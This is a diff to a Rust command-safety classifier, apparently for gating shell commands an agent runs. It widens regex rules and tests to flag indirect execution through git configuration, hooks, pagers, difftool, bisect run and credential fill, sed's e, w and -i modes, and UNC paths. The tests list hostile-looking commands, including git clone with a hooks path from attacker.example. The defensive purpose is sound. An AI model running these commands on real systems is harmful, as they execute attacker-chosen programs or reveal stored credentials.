@@ -67,9 +67,16 @@ static RISKY: Rules = LazyLock::new(|| {
             r"(?i)\bgit\s+(clone|fetch|pull|ls-remote|submodule|archive\s+--remote|remote\s+(add|set-url))\b|\bgit\b[^|;&\n]*\s--config\b",
             "git réseau ou configuration en ligne de commande",
         ),
+        // Any `git config` write can run a program later (include.path, filter.*.clean, diff.*.textconv, core.*);
+        // `grep -O<pager>`, `bisect run`, the diff/merge tools and `credential` run or reveal things themselves.
         (
-            r"(?i)\bsystem\s*\(|\bgit\b[^|;&\n]*\s(-c\s|--config-env\b)|\.git[\\/](hooks|config)\b|\bgit\s+config\b[^|;&\n]*\b(alias\.|core\.(hookspath|fsmonitor|sshcommand|pager|editor|askpass|gitproxy))",
-            "exécution indirecte (system(), configuration ou hooks git)",
+            r"(?i)\bsystem\s*\(|\bgit\b[^|;&\n]*\s(-c\s|--config-env\b|(?-i:-O)|--open-files-in-pager\b|--ext-diff\b)|\.git[\\/](hooks|config)\b|\bgit\s+(-\S+\s+)*(config|bisect\s+run|difftool|mergetool|instaweb|credential(-\S+)?)\b",
+            "exécution indirecte (system(), configuration, outils ou identifiants git)",
+        ),
+        // GNU sed runs commands (`e`, `s///e`) and writes files (`w`, `-i`) on its own.
+        (
+            r#"(?i)\bsed\b[^|;&\n]*(\s-[a-z]*i|\s--in-place\b|['";{}\s]\d*[ew](\s|['"])|/[gipm0-9]*[ew]['";\s])"#,
+            "sed qui exécute ou écrit (e, w, -i)",
         ),
         (
             r"(?i)\[(system\.)?io\.(file|directory)\]::|\.(delete|moveto|copyto|replace|writealltext|writeallbytes|writealllines|appendalltext|appendalllines|setaccesscontrol)\s*\(",
@@ -97,7 +104,7 @@ static RISKY: Rules = LazyLock::new(|| {
             "code inline ou exécution indirecte",
         ),
         (
-            r#"(?i)\.\.[\\/]|(^|[\s"'=(])\.\.([\s"'|;)]|$)|(^|[\s"'=(])[\\/]([\s"'|;)]|$)|(^|[\s"'=>(])([a-z]:[\\/]|~[\\/]|\$env:|\$home\b|%[a-z]+%|/(etc|usr|bin|sbin|var|root|home|boot|sys|proc|dev|opt|tmp)\b)"#,
+            r#"(?i)\.\.[\\/]|(^|[\s"'=(])\.\.([\s"'|;)]|$)|(^|[\s"'=(])[\\/]([\s"'|;)]|$)|(^|[\s"'=>(])([a-z]:[\\/]|\\\\[\w.?$-]+\\|~[\\/]|\$env:|\$home\b|%[a-z]+%|/(etc|usr|bin|sbin|var|root|home|boot|sys|proc|dev|opt|tmp)\b)"#,
             "chemin hors du dossier de travail",
         ),
     ])
@@ -366,13 +373,43 @@ mod tests {
             "git ls-remote https://attacker.example/x",
             "git clone --config core.hooksPath=hooks https://attacker.example/r",
             "git fetch origin",
+            // Audit 2026-10-25 (2): programs started by git or sed themselves, UNC paths.
+            "git config include.path evil.cfg",
+            "git --no-pager config include.path evil.cfg",
+            "git config filter.x.clean calc",
+            "git grep -Ocalc foo",
+            "git grep --open-files-in-pager=calc foo",
+            "git bisect run calc",
+            "git difftool -y",
+            "git credential fill",
+            "git diff --ext-diff",
+            "sed -n '1e calc' notes.txt",
+            "sed 's/a/b/e' notes.txt",
+            "sed 's/a/b/w out.txt' notes.txt",
+            "sed -i 's/a/b/' notes.txt",
+            "sed 'e' notes.txt",
+            r"gc \\?\C:\Windows\win.ini",
+            r"gci \\server\share",
         ] {
             assert!(matches!(assess(cmd), Verdict::Risky(_)), "{cmd}");
         }
         for cmd in ["$git = 'calc'; & $git", "cargo test; & ./run.exe", "echo $(./evil)"] {
             assert!(!matches!(assess(cmd), Verdict::Safe), "{cmd}");
         }
-        for cmd in ["cargo build --release", "git status", "Get-ChildItem -Recurse | Select-Object -First 5", "rg foo src"] {
+        for cmd in [
+            "cargo build --release",
+            "git status",
+            "Get-ChildItem -Recurse | Select-Object -First 5",
+            "rg foo src",
+            "sed -n '/error/p' build.log",
+            "sed -e 's/foo/bar/g' notes.txt",
+            "sed -n '10,20p' src/main.rs",
+            "git log --oneline -5",
+            "git grep -n foo",
+            "git grep -o foo",
+            r#"rg "\\bfoo" src"#,
+            r#"git commit -m "update config""#,
+        ] {
             assert!(matches!(assess(cmd), Verdict::Safe), "{cmd}");
         }
     }
